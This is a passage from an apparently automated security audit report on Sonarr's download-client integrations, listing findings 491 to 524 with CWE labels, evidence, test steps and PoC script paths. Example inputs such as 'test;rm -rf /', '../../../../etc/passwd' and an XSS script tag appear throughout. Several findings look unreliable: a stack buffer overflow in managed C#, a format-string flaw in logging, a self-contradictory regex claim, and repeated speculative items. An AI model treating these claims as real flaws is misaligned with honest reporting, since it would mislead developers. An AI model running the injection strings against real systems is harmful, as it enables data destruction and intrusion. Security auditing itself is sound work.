If user-provided data is used in the dynamic options, it could lead to command injection vulnerabilities when Deluge processes these options.

**Proof of Concept:**
If a user can control the download directory or completed directory paths in Deluge settings, and these paths are not properly sanitized, they could contain command injection payloads.

**How to Test:**
1. Test Deluge proxy with various directory paths
2. Check if paths are properly sanitized
3. Verify command injection vulnerabilities in file operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_Deluge_DelugeProxycs.py`
---

### 491. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Deluge/DelugeProxy.cs
**Line:** 150

**Description:**
The DelugeProxy class does not validate the input parameters for directory paths, which could lead to path traversal vulnerabilities.

**Evidence:**
```
The AddTorrentFromMagnet and AddTorrentFromFile methods set download_location and move_completed_path without validating the input paths.
```

**Impact:**
An attacker could manipulate directory paths to perform directory traversal attacks when setting up downloads.

**Proof of Concept:**
If a user can control the DownloadDirectory or CompletedDirectory settings in Deluge, they could set paths like '../../../../etc/passwd' to traverse directories.

**How to Test:**
1. Configure Deluge with malicious directory paths
2. Add torrents with these paths
3. Check if directory traversal occurs during download operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Deluge_DelugeProxycs.py`
---

### 492. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Deluge/DelugeSettings.cs
**Line:** 35

**Description:**
The DelugeSettings class contains a hardcoded default password that could be easily discovered by attackers.

**Evidence:**
```
The Password property has a default value 'deluge' in the constructor.
```

**Impact:**
If the default password is not changed by users, it could be easily discovered and used to authenticate with Deluge, potentially allowing unauthorized access to the download client.

**Proof of Concept:**
An attacker who can access the Sonarr configuration or code can easily find the hardcoded password 'deluge' and use it to authenticate with Deluge.

**How to Test:**
1. Check the DelugeSettings constructor for hardcoded values
2. Verify if the default password is used in production
3. Test if authentication works with the default password

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Deluge_DelugeSettingscs.py`
---

### 493. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Sabnzbd/Sabnzbd.cs
**Line:** 200

**Description:**
The GetCategories method in Sabnzbd class does not validate the paths from SABnzbd configuration, which could lead to path traversal vulnerabilities.

**Evidence:**
```
The method processes paths from SABnzbd configuration without proper validation of the directory paths.
```

**Impact:**
An attacker could manipulate SABnzbd configuration to include malicious paths that could lead to directory traversal when downloading files.

**Proof of Concept:**
If SABnzbd configuration contains paths like '../../../../etc/passwd' or '\\malicious-server\share\file.txt', these paths could be used to traverse directories when downloading files.

**How to Test:**
1. Configure SABnzbd with malicious directory paths
2. Add it to Sonarr
3. Check if the system properly validates and sanitizes these paths during download operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Sabnzbd_Sabnzbdcs.py`
---

### 494. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Sabnzbd/SabnzbdSettings.cs
**Line:** 35

**Description:**
The SabnzbdSettings class contains hardcoded default values for API key, username, and password that could be easily discovered by attackers.

**Evidence:**
```
The SabnzbdSettings class has default values for ApiKey, Username, and Password properties.
```

**Impact:**
If default credentials are not changed by users, they could be easily discovered and used to authenticate with SABnzbd, potentially allowing unauthorized access to the download client.

**Proof of Concept:**
An attacker who can access the Sonarr configuration or code can easily find the default credentials and use them to authenticate with SABnzbd.

**How to Test:**
1. Check the SabnzbdSettings constructor for hardcoded values
2. Verify if default credentials are used in production
3. Test if authentication works with default credentials

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Sabnzbd_SabnzbdSettingscs.py`
---

### 495. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/Sabnzbd/Sabnzbd.cs
**Line:** 200

**Description:**
The Sabnzbd client uses default authentication credentials that may not be properly validated or changed by users.

**Evidence:**
```
The SabnzbdSettings class has default values for API key, username, and password that could be used without proper user configuration.
```

**Impact:**
If users don't change the default credentials, unauthorized parties could access the SABnzbd daemon and potentially control downloads.

**Proof of Concept:**
An attacker with access to Sonarr configuration can use the default credentials to make authenticated requests to SABnzbd.

**How to Test:**
1. Check if default credentials are used in production
2. Test authentication with default credentials
3. Verify if credential validation is performed properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_Sabnzbd_Sabnzbdcs.py`
---

### 496. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/DownloadStationSettings.cs
**Line:** 25

**Description:**
The TvCategory validation regex allows only lowercase letters and hyphens but doesn't validate for potential path traversal or command injection.

**Evidence:**
```
The regex pattern "^\.?[-a-z]*$" allows categories like "..", "/", or "../" which could be exploited in path operations.
```

**Impact:**
Maliciously crafted category names could lead to path traversal vulnerabilities when used in file operations or directory handling.

**Proof of Concept:**
If a category name like "../" is used, it could potentially allow directory traversal when constructing file paths in the download station integration.

**How to Test:**
1. Try to set a TvCategory with path traversal characters like "../" or "..\"
2. Check if these values are properly sanitized in file operations
3. Test if they can be used to access files outside intended directories

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_DownloadStation_DownloadStationSettingscs.py`
---

### 497. Improper Neutralization of Special Elements used in Command Line (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrentProxy.cs
**Line:** 132

**Description:**
The SetTorrentLabel method directly incorporates label parameter into XML-RPC request without proper sanitization.

**Evidence:**
```
The method calls ExecuteRequest(settings, "d.custom1.set", hash, label) where label parameter is used directly without sanitization.
```

**Impact:**
An attacker could inject malicious commands or data into the rTorrent label field, potentially affecting how torrents are processed or displayed.

**Proof of Concept:**
If an attacker can control the label parameter, they could pass a label like "test;rm -rf /" which might be processed in unexpected ways by rTorrent.

**How to Test:**
1. Set up a test rTorrent instance with the Sonarr configuration
2. Try to set a torrent label with special characters
3. Check if labels are properly sanitized in XML-RPC calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentProxycs.py`
---

### 498. Improper Neutralization of Special Elements used in Command Line (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrentProxy.cs
**Line:** 140

**Description:**
The PushTorrentUniqueView method directly incorporates view parameter into XML-RPC request without proper sanitization.

**Evidence:**
```
The method calls ExecuteRequest(settings, "d.views.push_back_unique", hash, view) where view parameter is used directly without sanitization.
```

**Impact:**
An attacker could inject malicious commands or data into the rTorrent view field, potentially affecting how torrents are displayed or managed.

**Proof of Concept:**
If an attacker can control the view parameter, they could pass a view like "test;rm -rf /" which might be processed in unexpected ways by rTorrent.

**How to Test:**
1. Set up a test rTorrent instance with the Sonarr configuration
2. Try to push a unique view with special characters
3. Check if views are properly sanitized in XML-RPC calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentProxycs.py`
---

### 499. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/DownloadStationSettings.cs
**Line:** 20

**Description:**
The TvDirectory validation allows paths that start with '/' but doesn't properly validate the entire path structure.

**Evidence:**
```
The validation rule "RuleFor(c => c.TvDirectory).Matches(@"^(?!/).+")" allows paths starting with '/' but then validates with "Cannot start with /" message.
```

**Impact:**
The validation logic is inconsistent and could allow paths that might be vulnerable to path traversal or injection attacks.

**Proof of Concept:**
A path like "/../" might pass validation but could be processed incorrectly in file operations.

**How to Test:**
1. Try to set TvDirectory with various path formats including those starting with '/'
2. Check if validation consistently rejects paths starting with '/'
3. Test path processing with these values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_DownloadStation_DownloadStationSettingscs.py`
---

### 500. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrentProxy.cs
**Line:** 147

**Description:**
The RemoveTorrent method directly incorporates hash parameter into XML-RPC request without proper sanitization.

**Evidence:**
```
The method calls ExecuteRequest(settings, "d.erase", hash) where hash parameter is used directly without sanitization.
```

**Impact:**
An attacker could potentially inject malicious commands or data through the torrent hash parameter, affecting how torrents are removed.

**Proof of Concept:**
If an attacker can control the hash parameter, they could pass a hash like "test;rm -rf /" which might be processed in unexpected ways by rTorrent.

**How to Test:**
1. Set up a test rTorrent instance with the Sonarr configuration
2. Try to remove a torrent with a specially crafted hash
3. Check if the hash is properly sanitized in XML-RPC calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentProxycs.py`
---

### 501. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/DownloadStationTask.cs
**Line:** 20

**Description:**
The DownloadStationTask class doesn't validate the Type property which can contain values like BT, NZB, http, ftp, eMule, https.

**Evidence:**
```
The Type property is directly assigned from API responses without validation, potentially allowing injection of unexpected values.
```

**Impact:**
Unvalidated Type values could lead to unexpected behavior or injection vulnerabilities when processing different task types.

**Proof of Concept:**
If an API response returns a Type value like "http;rm -rf /" or "NZB<script>alert(1)</script>", it might be processed incorrectly.

**How to Test:**
1. Mock an API response with invalid Type values
2. Check how the Type property is used in processing
3. Test if invalid values cause unexpected behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_DownloadStation_DownloadStationTaskcs.py`
---

### 502. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/Proxies/DownloadStationTaskProxyV2.cs
**Line:** 44

**Description:**
The AddTaskFromUrl method directly incorporates URL parameter into form parameters without proper sanitization.

**Evidence:**
```
The method adds URL parameter directly to form parameters: requestBuilder.AddQueryParam("url", url).
```

**Impact:**
An attacker could inject malicious data into the URL parameter, potentially affecting how tasks are added to Download Station.

**Proof of Concept:**
If an attacker can control the URL parameter, they could pass a URL like "http://example.com/torrent?param=;rm -rf /;" which might be processed incorrectly by Download Station.

**How to Test:**
1. Set up a test Download Station instance
2. Try to add a task with a URL containing special characters
3. Check if URLs are properly sanitized in API calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_DownloadStation_Proxies_DownloadStationTaskProxyV2cs.py`
---

### 503. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/Proxies/DownloadStationTaskProxyV2.cs
**Line:** 54

**Description:**
The AddTaskFromUrl method directly incorporates destination parameter into form parameters without proper sanitization.

**Evidence:**
```
The method adds destination parameter directly to form parameters: requestBuilder.AddQueryParam("destination", downloadDirectory).
```

**Impact:**
An attacker could inject malicious data into the destination parameter, potentially affecting where tasks are downloaded.

**Proof of Concept:**
If an attacker can control the downloadDirectory parameter, they could pass a destination like "/tmp/;rm -rf /;" which might be processed incorrectly by Download Station.

**How to Test:**
1. Set up a test Download Station instance
2. Try to add a task with a destination containing special characters
3. Check if destinations are properly sanitized in API calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_DownloadStation_Proxies_DownloadStationTaskProxyV2cs.py`
---

### 504. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/Proxies/DownloadStationTaskProxyV1.cs
**Line:** 50

**Description:**
The AddTaskFromUrl method directly incorporates URL parameter into query parameters without proper sanitization.

**Evidence:**
```
The method adds URL parameter directly to query parameters: requestBuilder.AddQueryParam("uri", url).
```

**Impact:**
An attacker could inject malicious data into the URL parameter, potentially affecting how tasks are added to Download Station.

**Proof of Concept:**
If an attacker can control the URL parameter, they could pass a URL like "http://example.com/torrent?param=;rm -rf /;" which might be processed incorrectly by Download Station.

**How to Test:**
1. Set up a test Download Station instance
2. Try to add a task with a URL containing special characters
3. Check if URLs are properly sanitized in API calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_DownloadStation_Proxies_DownloadStationTaskProxyV1cs.py`
---

### 505. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/DownloadStation/Proxies/DownloadStationTaskProxyV1.cs
**Line:** 58

**Description:**
The AddTaskFromUrl method directly incorporates destination parameter into query parameters without proper sanitization.

**Evidence:**
```
The method adds destination parameter directly to query parameters: requestBuilder.AddQueryParam("destination", downloadDirectory).
```

**Impact:**
An attacker could inject malicious data into the destination parameter, potentially affecting where tasks are downloaded.

**Proof of Concept:**
If an attacker can control the downloadDirectory parameter, they could pass a destination like "/tmp/;rm -rf /;" which might be processed incorrectly by Download Station.

**How to Test:**
1. Set up a test Download Station instance
2. Try to add a task with a destination containing special characters
3. Check if destinations are properly sanitized in API calls

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_DownloadStation_Proxies_DownloadStationTaskProxyV1cs.py`
---

### 506. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Transmission/TransmissionSettings.cs
**Line:** 45

**Description:**
The TvCategory validation regex allows only lowercase letters and hyphens but doesn't validate for path traversal or other dangerous characters.

**Evidence:**
```
The validation regex @"^\.?[-a-z]*$" in TransmissionSettings.cs allows categories like "../test" which could lead to path traversal issues.
```

**Impact:**
Improperly validated category names could lead to path traversal vulnerabilities when used in file operations or directory handling.

**Proof of Concept:**
Configure TvCategory to "../../../etc/passwd" and observe if this value is used in file operations without proper sanitization.

**How to Test:**
1. Set TvCategory to a path traversal value like "../config"
2. Monitor file operations for unexpected directory access
3. Check if the value is used in path construction without validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Transmission_TransmissionSettingscs.py`
---

### 507. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrent.cs
**Line:** 104

**Description:**
The code doesn't properly neutralize special elements in commands that are passed to the rTorrent proxy, potentially leading to command injection.

**Evidence:**
```
The _proxy.SetTorrentLabel() and _proxy.PushTorrentUniqueView() methods receive user-provided values (category names, view names) without proper escaping or validation.
```

**Impact:**
If the underlying rTorrent proxy implementation executes these values in shell contexts, attackers could inject malicious commands.

**Proof of Concept:**
Set TvImportedCategory to "test; rm -rf /" and observe if this command gets executed during torrent label setting.

**How to Test:**
1. Configure TvImportedCategory with shell command injection patterns
2. Trigger the MarkItemAsImported method
3. Monitor system for unexpected command execution

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentcs.py`
---

### 508. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrent.cs
**Line:** 104

**Description:**
The rTorrent client implementation doesn't implement CSRF protection for its API endpoints, making it vulnerable to CSRF attacks.

**Evidence:**
```
The code uses HTTP requests to communicate with rTorrent but doesn't implement CSRF tokens or referer validation for its API calls.
```

**Impact:**
An attacker could trick a logged-in user into performing unauthorized actions on the rTorrent client through crafted requests.

**Proof of Concept:**
Create a malicious webpage that submits requests to the rTorrent API endpoints when a user visits it while authenticated.

**How to Test:**
1. Access Sonarr with a logged-in user
2. Create a malicious page that submits requests to rTorrent API
3. Verify if the requests are processed without CSRF validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentcs.py`
---

### 509. Improper Control of Dynamically-Loaded Code (CWE-913)

**File:** src/NzbDrone.Core/Download/Clients/Tribler/TriblerDownloadClientProxy.cs
**Line:** 40

**Description:**
The Tribler client uses dynamic HTTP requests with user-provided API keys and URLs, potentially allowing code injection or path traversal.

**Evidence:**
```
The GetRequestBuilder method in TriblerDownloadClientProxy.cs constructs URLs using user-provided settings without proper validation.
```

**Impact:**
Improperly validated URLs or API keys could lead to path traversal or injection vulnerabilities when constructing API requests.

**Proof of Concept:**
Configure Tribler with a malicious URL base and observe if it's used in API requests without proper sanitization.

**How to Test:**
1. Configure Tribler with a URL base containing path traversal sequences
2. Trigger API calls to the Tribler client
3. Monitor for unexpected path resolution or injection

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-913_src_NzbDroneCore_Download_Clients_Tribler_TriblerDownloadClientProxycs.py`
---

### 510. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Download/Clients/Transmission/TransmissionBase.cs
**Line:** 100

**Description:**
The code uses string operations that could lead to buffer overflows when handling large torrent data or labels.

**Evidence:**
```
The GetItems method in TransmissionBase.cs processes torrent data and labels without bounds checking for potentially large inputs.
```

**Impact:**
Large torrent labels or metadata could cause buffer overflows, potentially leading to crashes or code execution.

**Proof of Concept:**
Create torrents with extremely long labels or metadata that exceed typical buffer sizes and observe system behavior.

**How to Test:**
1. Create torrents with very long labels or metadata
2. Process these torrents through the Transmission client
3. Monitor for buffer overflow conditions or crashes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Download_Clients_Transmission_TransmissionBasecs.py`
---

### 511. Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Transmission/TransmissionBase.cs
**Line:** 100

**Description:**
The code doesn't properly validate or sanitize paths when processing torrents, potentially allowing path traversal attacks.

**Evidence:**
```
In TransmissionBase.cs, the GetItems method processes torrent paths without proper validation against allowed directories.
```

**Impact:**
An attacker could manipulate torrent paths to access files outside of the intended download directories.

**Proof of Concept:**
Configure a torrent with a path like "../../../etc/passwd" and verify if it's processed without proper path validation.

**How to Test:**
1. Create torrents with path traversal sequences in their paths
2. Process these torrents through the Transmission client
3. Check if the system allows access to files outside intended directories

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Transmission_TransmissionBasecs.py`
---

### 512. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Download/Clients/rTorrent/RTorrent.cs
**Line:** 104

**Description:**
The code uses string formatting with user-provided values that could lead to format string vulnerabilities.

**Evidence:**
```
The _logger.Warn calls in MarkItemAsImported method use user-provided category names and titles in format strings without proper validation.
```

**Impact:**
Maliciously crafted category names or titles could lead to format string vulnerabilities in logging operations.

**Proof of Concept:**
Set TvImportedCategory to contain format specifiers like "%s%s%s" and observe if they're properly handled in logging.

**How to Test:**
1. Configure TvImportedCategory with format string specifiers
2. Trigger logging operations
3. Verify if format string vulnerabilities are present

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Download_Clients_rTorrent_RTorrentcs.py`
---

### 513. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Transmission/TransmissionSettings.cs
**Line:** 45

**Description:**
The code stores sensitive information like passwords in configuration files without proper encryption or obfuscation.

**Evidence:**
```
TransmissionSettings.cs stores Username and Password fields with PrivacyLevel.Password but doesn't implement additional encryption for sensitive data.
```

**Impact:**
If configuration files are compromised, attacker gains access to Transmission credentials without additional protection.

**Proof of Concept:**
Check if Transmission password is stored in plain text in configuration files and verify if it's accessible to unauthorized users.

**How to Test:**
1. Examine configuration files for Transmission settings
2. Verify if passwords are stored in plain text
3. Check file permissions for configuration files

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Transmission_TransmissionSettingscs.py`
---

### 514. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/UsenetBlackhole.cs
**Line:** 44

**Description:**
The filename parameter in AddFromNzbFile method is not properly validated before being used in file operations, potentially leading to path traversal vulnerabilities.

**Evidence:**
```
The method uses remoteEpisode.Release.Title directly in FileNameBuilder.CleanFileName() and then combines it with Settings.NzbFolder without additional validation.
```

**Impact:**
An attacker could potentially write NZB files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If remoteEpisode.Release.Title contains '../evil.nzb', the file could be written outside the intended NzbFolder directory.

**How to Test:**
Test with a release title containing path traversal sequences like '../' or '../../' and verify if files can be written outside the NzbFolder.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Blackhole_UsenetBlackholecs.py`
---

### 515. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/TorrentBlackhole.cs
**Line:** 58

**Description:**
The filename parameter in AddFromTorrentFile method is not properly validated before being used in file operations, potentially leading to path traversal vulnerabilities.

**Evidence:**
```
The method uses remoteEpisode.Release.Title directly in FileNameBuilder.CleanFileName() and then combines it with Settings.TorrentFolder without additional validation.
```

**Impact:**
An attacker could potentially write torrent files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If remoteEpisode.Release.Title contains '../evil.torrent', the file could be written outside the intended TorrentFolder directory.

**How to Test:**
Test with a release title containing path traversal sequences like '../' or '../../' and verify if files can be written outside the TorrentFolder.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Blackhole_TorrentBlackholecs.py`
---

### 516. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/TorrentBlackhole.cs
**Line:** 42

**Description:**
The magnetLink parameter in AddFromMagnetLink method is not properly validated before being written to disk, potentially leading to path traversal vulnerabilities.

**Evidence:**
```
The method uses remoteEpisode.Release.Title directly in FileNameBuilder.CleanFileName() and then combines it with Settings.TorrentFolder without additional validation.
```

**Impact:**
An attacker could potentially write magnet files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If remoteEpisode.Release.Title contains '../evil.magnet', the file could be written outside the intended TorrentFolder directory.

**How to Test:**
Test with a release title containing path traversal sequences like '../' or '../../' and verify if files can be written outside the TorrentFolder.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Blackhole_TorrentBlackholecs.py`
---

### 517. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy uses parameters that could be manipulated to inject commands into the nzbget API calls.

**Evidence:**
```
The ProcessRequest method accepts parameters that are passed directly to the nzbget API without proper sanitization, particularly in the DownloadNzbLegacy12 method.
```

**Impact:**
An attacker could potentially manipulate the nzbget API calls to execute unintended commands or access unauthorized resources.

**Proof of Concept:**
If parameters passed to nzbget API methods are not properly sanitized, an attacker could inject malicious parameters that affect the API behavior.

**How to Test:**
Test API calls with specially crafted parameters to see if they affect the nzbget API behavior or if command injection is possible.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 518. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy does not properly neutralize special elements in API parameters, potentially leading to command injection.

**Evidence:**
```
The ProcessRequest method passes parameters directly to nzbget API without proper escaping or validation of special characters.
```

**Impact:**
An attacker could inject special characters that affect the nzbget API behavior or potentially execute unintended commands.

**Proof of Concept:**
If API parameters contain special characters like semicolons, pipes, or other command separators, they could affect the API call execution.

**How to Test:**
Test API calls with parameters containing special characters and observe if they affect the API behavior or if command injection is possible.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 519. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetSettings.cs
**Line:** 40

**Description:**
The NzbgetSettings class stores sensitive information like Username and Password in cleartext, which could be exposed in logs or configuration files.

**Evidence:**
```
The NzbgetSettings class has Username and Password properties with PrivacyLevel.Password and PrivacyLevel.UserName respectively, but the actual storage and handling may not be fully protected.
```

**Impact:**
If configuration files or logs are not properly secured, credentials could be exposed to unauthorized users.

**Proof of Concept:**
Configuration files containing NzbgetSettings with Username and Password fields could be read by unauthorized users.

**How to Test:**
Check if configuration files are properly secured and if credentials are logged or exposed in any way during operation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetSettingscs.py`
---

### 520. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexSettings.cs
**Line:** 40

**Description:**
The NzbVortexSettings class stores sensitive information like ApiKey in cleartext, which could be exposed in logs or configuration files.

**Evidence:**
```
The NzbVortexSettings class has ApiKey property with PrivacyLevel.ApiKey, but the actual storage and handling may not be fully protected.
```

**Impact:**
If configuration files or logs are not properly secured, API keys could be exposed to unauthorized users.

**Proof of Concept:**
Configuration files containing NzbVortexSettings with ApiKey field could be read by unauthorized users.

**How to Test:**
Check if configuration files are properly secured and if API keys are logged or exposed in any way during operation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexSettingscs.py`
---

### 521. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/UsenetBlackhole.cs
**Line:** 44

**Description:**
The AddFromNzbFile method in UsenetBlackhole does not validate the filename before writing to disk, potentially allowing path traversal attacks.

**Evidence:**
```
The method constructs filepath using Path.Combine(Settings.NzbFolder, title + ".nzb") without validating that title doesn't contain path traversal sequences.
```

**Impact:**
An attacker could write NZB files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If title contains '../config/nzbfile.nzb', the file would be written to the parent directory instead of the intended NzbFolder.

**How to Test:**
Test with release titles containing path traversal sequences and verify file locations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Blackhole_UsenetBlackholecs.py`
---

### 522. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/TorrentBlackhole.cs
**Line:** 58

**Description:**
The AddFromTorrentFile method in TorrentBlackhole does not validate the filename before writing to disk, potentially allowing path traversal attacks.

**Evidence:**
```
The method constructs filepath using Path.Combine(Settings.TorrentFolder, string.Format("{0}.torrent", title)) without validating that title doesn't contain path traversal sequences.
```

**Impact:**
An attacker could write torrent files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If title contains '../config/torrentfile.torrent', the file would be written to the parent directory instead of the intended TorrentFolder.

**How to Test:**
Test with release titles containing path traversal sequences and verify file locations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Blackhole_TorrentBlackholecs.py`
---

### 523. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Blackhole/TorrentBlackhole.cs
**Line:** 42

**Description:**
The AddFromMagnetLink method in TorrentBlackhole does not validate the filename before writing to disk, potentially allowing path traversal attacks.

**Evidence:**
```
The method constructs filepath using Path.Combine(Settings.TorrentFolder, $"{title}.{Settings.MagnetFileExtension.Trim('.')}"), without validating that title doesn't contain path traversal sequences.
```

**Impact:**
An attacker could write magnet files to arbitrary locations on the filesystem by manipulating the release title.

**Proof of Concept:**
If title contains '../config/magnetfile.magnet', the file would be written to the parent directory instead of the intended TorrentFolder.

**How to Test:**
Test with release titles containing path traversal sequences and verify file locations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Blackhole_TorrentBlackholecs.py`
---

### 524. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy could be vulnerable to XSS if response content is not properly sanitized before being returned to clients.

**Evidence:**
```
The ProcessRequest method returns JSON responses that may contain user-provided data without proper sanitization.
```

**Impact:**
If the API responses are consumed by web applications, XSS vulnerabilities could be introduced.

**Proof of Concept:**
